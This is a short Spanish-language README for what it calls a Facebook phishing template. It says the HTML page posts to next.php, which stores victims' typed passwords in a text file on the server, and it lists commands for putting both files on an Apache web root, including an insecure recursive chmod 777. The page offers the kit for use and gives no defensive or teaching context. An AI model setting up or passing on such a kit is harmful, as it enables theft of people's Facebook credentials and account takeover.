# Pishing-templates
Ejemplo de una template de Pishing de facebook

# funcionalidad:

* La plantilla HTML hace un llamado al archivo PHP "next.php" con lo cual este es el encargado
de almacenar las contraseñas escritas en un archivo de texto dentro del servidor.

# Instalacion:

* Solo deben instalar apache2 en su servidor y mover los dos archivos dentro de su servidor web
* apt-get install apache2 -y
* mv index.html /var/www/html
* mv next.php /var/www/html
* service apache2 start
* chmod -R 777 * /var/www/html
